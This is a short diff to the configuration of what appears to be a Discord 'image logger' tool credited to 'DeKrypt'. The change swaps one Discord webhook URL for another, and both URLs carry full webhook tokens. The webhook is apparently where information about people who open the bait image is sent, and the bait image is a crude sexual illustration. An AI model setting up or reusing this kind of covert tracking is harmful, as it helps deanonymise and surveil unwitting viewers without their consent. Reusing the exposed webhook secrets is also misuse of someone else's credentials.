@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1338732030040604693/lM82yG143KHKgLNgLWKnzN58bcRufJ9qh-jiywon7IEnMyumgQdiVjkYPZSEiWpSND-T",
+    "webhook": "https://discord.com/api/webhooks/1352156778259025980/Ju9Yx18do6-jOBBEysRUDdUj9PgA8urlZVdYm7i9EhdJGzsjFMEAxVXnoEFVP2J59xzJ",
     "image": "https://images.pond5.com/male-sex-organ-penis-reproductive-illustration-237237854_iconl.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
